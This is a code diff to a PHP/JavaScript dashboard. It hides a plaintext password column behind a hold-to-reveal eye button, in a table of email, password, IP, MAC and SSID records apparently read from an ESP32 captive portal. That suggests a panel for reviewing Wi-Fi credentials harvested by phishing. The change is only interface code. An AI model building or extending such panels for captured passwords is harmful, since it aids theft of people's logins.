@@ -155,6 +155,31 @@ $nombre = $_SESSION['user_nombre'];
             border-radius: 10px; font-size: 11px; font-weight: 700;
             margin-left: 6px;
         }
+	.pwd-hidden {
+            color: #6c7086;
+            font-family: 'JetBrains Mono', monospace;
+            letter-spacing: 3px;
+            user-select: none;
+        }
+        .pwd-visible {
+            color: #f38ba8;
+            font-family: 'JetBrains Mono', monospace;
+            letter-spacing: 0;
+        }
+        .btn-eye {
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            font-size: 13px;
+            padding: 2px 6px;
+            margin-left: 4px;
+            border-radius: 4px;
+            opacity: 0.5;
+            transition: all 0.2s;
+            line-height: 1;
+         }
+         .btn-eye:hover { opacity: 1; background: #313244; }
+         .btn-eye:active { transform: scale(0.9); }
     </style>
 </head>
 <body>
@@ -800,7 +825,16 @@ $nombre = $_SESSION['user_nombre'];
                 tbody.innerHTML = data.registros.map(r => `
                     <tr>
                         <td>${esc(r.correo)}</td>
-                        <td><code style="color:#f38ba8;">${esc(r.contrasena)}</code></td>
+			<td>
+                            <span class="pwd-hidden" data-pwd="${esc(r.contrasena)}">••••••••</span>
+                            <button class="btn-eye"
+                                onmousedown="showPwd(this)"
+                                onmouseup="hidePwd(this)"
+                                onmouseleave="hidePwd(this)"
+                                ontouchstart="showPwd(this)"
+                                ontouchend="hidePwd(this)"
+                                title="Mantén presionado para ver">👁️</button>
+			</td>
                         <td>${esc(r.ip)}</td>
                         <td><code style="color:#a6e3a1;">${esc(r.mac)}</code></td>
                         <td>${esc(r.ssid)}</td>
@@ -812,6 +846,18 @@ $nombre = $_SESSION['user_nombre'];
             .catch(e => {
                 document.getElementById('portal-tbody').innerHTML = '<tr><td colspan="6" style="text-align:center; color:#f38ba8;">Error al cargar: ' + e.message + '</td></tr>';
             });
+        }
+     	function showPwd(btn) {
+            const span = btn.previousElementSibling;
+            span.textContent = span.dataset.pwd;
+            span.classList.add('pwd-visible');
+            span.classList.remove('pwd-hidden');
+        }
+        function hidePwd(btn) {
+            const span = btn.previousElementSibling;
+            span.textContent = '••••••••';
+            span.classList.add('pwd-hidden');
+            span.classList.remove('pwd-visible');
         }
         // ============================================================
         // LECTURA DEL ESP32
